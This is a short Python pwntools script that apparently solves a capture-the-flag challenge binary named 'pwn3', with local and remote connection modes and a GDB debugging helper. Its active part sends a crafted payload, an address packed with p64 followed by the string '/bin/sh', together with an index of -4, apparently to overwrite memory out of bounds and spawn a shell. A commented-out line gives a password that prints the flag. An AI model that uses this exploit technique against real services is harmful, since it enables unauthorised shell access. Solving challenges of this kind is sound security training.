#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "000000000"
exe = context.binary = ELF('./pwn3', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*main+78
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# Way 1: cat flag.txt
# p.sendlineafter(b"bytes): ", b"d1nhdwc")
# p.sendlineafter(b"exit): ", b"0")

# Way 2: get system("/bin/sh")
# # GDB()
p.sendlineafter(b"bytes): ", p64(0x4040a8) + b"/bin/sh\0")
p.sendlineafter(b"exit): ", b"-4")

p.interactive()